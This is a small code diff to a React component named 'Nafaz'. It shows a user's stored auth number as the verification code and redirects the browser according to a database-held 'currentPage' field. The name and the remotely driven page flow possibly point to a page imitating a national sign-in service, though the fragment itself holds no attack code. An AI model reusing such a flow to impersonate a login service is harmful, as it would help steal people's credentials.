@@ -43,7 +43,8 @@ export default function Nafaz() {
           if (docSnapshot.exists()) {
             const userData = docSnapshot.data()
             // Assuming the PIN is stored in a field called 'nafaz_pin'
-            setVerificationCode(userData)
+            setVerificationCode(userData.auth_number)
+            
 
             if (userData.currentPage === '1') {
               window.location.href = '/'
